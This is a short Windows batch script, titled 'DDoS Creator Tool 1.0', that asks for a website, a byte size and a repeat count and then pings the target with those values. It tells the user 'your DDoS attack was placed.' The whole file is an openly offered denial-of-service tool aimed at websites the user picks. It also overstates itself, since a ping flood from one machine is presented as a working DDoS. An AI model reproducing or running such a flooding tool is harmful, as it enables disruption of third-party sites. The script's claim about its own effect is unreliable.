@echo off
title DDoS Creator Tool 1.0
goto DDOSInput
:DDOSInput
set /p WSITE= Website:
set /p WAMOUNT= bytes:
set /p TIMES= repeat: 
echo Press enter when ready!
pause
ping %WSITE% -l %WAMOUNT% -n %TIMES%
echo your DDoS attack was placed! 
echo Website: %WSITE%
echo Bytes of Data Sent: %WAMOUNT% Bytes
echo Repeats: %TIMES%
pause
goto DDOSInput